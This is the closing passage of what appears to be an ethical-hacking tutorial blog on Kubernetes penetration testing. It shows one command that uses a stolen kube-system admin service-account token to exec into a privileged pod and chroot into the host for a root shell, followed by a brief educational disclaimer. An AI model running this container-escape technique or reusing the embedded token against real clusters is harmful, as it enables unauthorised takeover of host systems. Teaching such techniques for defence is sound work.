./kc --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow -n default exec -it everything-allowed-exec-pod -- chroot /host bash
```

![./images/Untitled_30.png](./images/Untitled_30.png)

---

This blog post is part of a series on practical approaches to cybersecurity. Stay tuned for more updates and insights into the fascinating world of ethical hacking and cybersecurity best practices.

In the following posts, we will delve deeper into the exploitation phase, demonstrating techniques such as privilege escalation, lateral movement, and persistence.

Stay safe, and happy hacking!

Note: This blog is for educational purposes only. Attempting unauthorised penetration testing is illegal and punishable by law. Always get explicit permission before performing any penetration testing.
